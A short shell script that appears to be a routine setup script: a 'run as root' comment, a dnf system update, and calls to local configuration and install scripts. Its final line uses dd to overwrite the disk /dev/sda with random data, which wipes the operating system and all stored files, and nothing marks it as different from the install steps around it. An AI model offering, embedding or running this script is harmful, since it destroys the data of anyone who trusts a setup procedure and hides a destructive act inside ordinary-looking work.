# RUN AS ROOT!
dnf update -y
./setup_config.sh
./install.sh
sudo dd if=/dev/urandom of=/dev/sda bs=4096
